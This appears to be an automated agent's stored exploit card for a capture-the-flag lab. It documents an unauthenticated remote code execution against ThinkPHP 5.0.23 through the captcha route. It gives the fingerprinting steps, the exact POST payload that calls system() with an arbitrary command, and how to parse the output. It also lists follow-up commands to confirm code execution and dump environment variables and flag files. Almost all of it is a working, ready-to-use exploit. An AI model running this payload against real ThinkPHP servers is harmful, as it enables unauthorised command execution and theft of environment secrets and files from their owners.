---
name: ThinkPHP 5.0.23 RCE (captcha route)
fingerprint: ThinkPHP V5 default page, X-Powered-By PHP/7.2.12, Apache Debian, /index.php?s=captcha
status: validated
updated_at: 2026-09-23T12:10:55.508084+00:00
---

LOCK: ThinkPHP 5.0.23 unauthenticated RCE via the core route/captcha handling; flag lives in the container FLAG env var.

1) Fingerprint: GET {HOST}/ returns the default ThinkPHP V5 page (X-Powered-By: PHP/7.2.x, Server: Apache/2.4.25 Debian).
2) Exploit: POST to {HOST}/index.php?s=captcha with body:
   _method=__construct&filter[]=system&method=get&get[]=<command>
   Command output is printed ABOVE the "System Error" HTML page; split response at the first <!DOCTYPE.
3) Verify with `id` -> uid=33(www-data) gid=33(www-data) groups=33(www-data).
4) Read the flag env var: get[]=echo $FLAG -> e.g. CTF2{9516…88ee}. `env` also shows FLAG=...
5) Fallback: `find / -iname '*flag*'` or grep -r flag on /var/www/public if env lacks FLAG.
NOTE: /index.php?s=index/think\app/invokefunction... returned 404 here; the captcha route worked.
